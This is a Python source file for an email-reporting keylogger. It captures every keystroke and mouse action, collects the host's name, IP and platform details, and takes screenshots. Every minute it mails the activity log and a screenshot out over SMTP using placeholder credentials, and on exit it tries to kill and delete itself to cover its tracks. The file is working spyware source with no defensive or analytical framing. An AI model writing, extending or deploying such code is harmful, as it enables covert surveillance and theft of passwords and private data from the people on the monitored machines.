import logging
import os
import platform
import smtplib
import socket
import threading
import pyscreenshot
from pynput import keyboard, mouse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import json
from datetime import datetime

class KeyloggerEmail:
    def __init__(self, email_address, email_password, interval=60):
        self.email_address = email_address
        self.email_password = email_password
        self.interval = interval
        self.log = "Keylogger Started...\n"
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
    def append_log(self, text):
        self.log += f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n"
        
    def on_move(self, x, y):
        self.append_log(f"Mouse moved to ({x}, {y})")
        
    def on_click(self, x, y, button, pressed):
        action = 'Pressed' if pressed else 'Released'
        self.append_log(f"Mouse {action} at ({x}, {y}) with {button}")
        
    def on_scroll(self, x, y, dx, dy):
        self.append_log(f"Mouse scrolled at ({x}, {y})")
        
    def on_press(self, key):
        try:
            self.append_log(f'Key pressed: {key.char}')
        except AttributeError:
            self.append_log(f'Special key pressed: {key}')
            
    def get_system_info(self):
        info = {
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "Platform": platform.platform(),
            "Processor": platform.processor(),
            "Machine": platform.machine(),
            "System": platform.system()
        }
        return "\n".join(f"{k}: {v}" for k, v in info.items())
        
    def take_screenshot(self):
        try:
            img = pyscreenshot.grab()
            screenshot_path = "screenshot.png"
            img.save(screenshot_path)
            return screenshot_path
        except Exception as e:
            self.append_log(f"Screenshot failed: {str(e)}")
            return None
            
    def send_email(self):
        msg = MIMEMultipart()
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"
        
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = f"Keylogger Report - {self.start_time}"
        
        # Add system info and logs
        body = f"System Information:\n{self.get_system_info()}\n\nActivity Log:\n{self.log}"
        msg.attach(MIMEText(body, 'plain'))
        
        # Add screenshot if available
        screenshot_path = self.take_screenshot()
        if screenshot_path and os.path.exists(screenshot_path):
            with open(screenshot_path, 'rb') as f:
                img_data = f.read()
            image = MIMEImage(img_data, name="screenshot.png")
            msg.attach(image)
            os.remove(screenshot_path)
            
        try:
            server = smtplib.SMTP("smtp.mailtrap.io", 2525)
            server.login(self.email_address, self.email_password)
            server.sendmail(sender, receiver, msg.as_string())
            server.quit()
            self.log = "Keylogger Started...\n"  # Clear log after sending
        except Exception as e:
            self.append_log(f"Failed to send email: {str(e)}")
            
    def report(self):
        self.send_email()
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def self_destruct(self):
        if platform.system() == "Windows":
            try:
                os.system(f"TASKKILL /F /IM {os.path.basename(__file__)}")
                os.system(f"DEL {os.path.basename(__file__)}")
            except:
                pass
        else:
            try:
                os.system(f"rm -rf {os.path.basename(__file__)}")
            except:
                pass
                
    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        mouse_listener = mouse.Listener(
            on_move=self.on_move,
            on_click=self.on_click,
            on_scroll=self.on_scroll
        )
        
        keyboard_listener.start()
        mouse_listener.start()
        
        self.append_log(self.get_system_info())
        self.report()
        
        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    # Email configuration
    EMAIL_ADDRESS = "YOUR_USERNAME"
    EMAIL_PASSWORD = "YOUR_PASSWORD"
    SEND_REPORT_EVERY = 60  # as in seconds
    
    keylogger = KeyloggerEmail(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY)
    try:
        keylogger.run()
    except KeyboardInterrupt:
        keylogger.self_destruct()
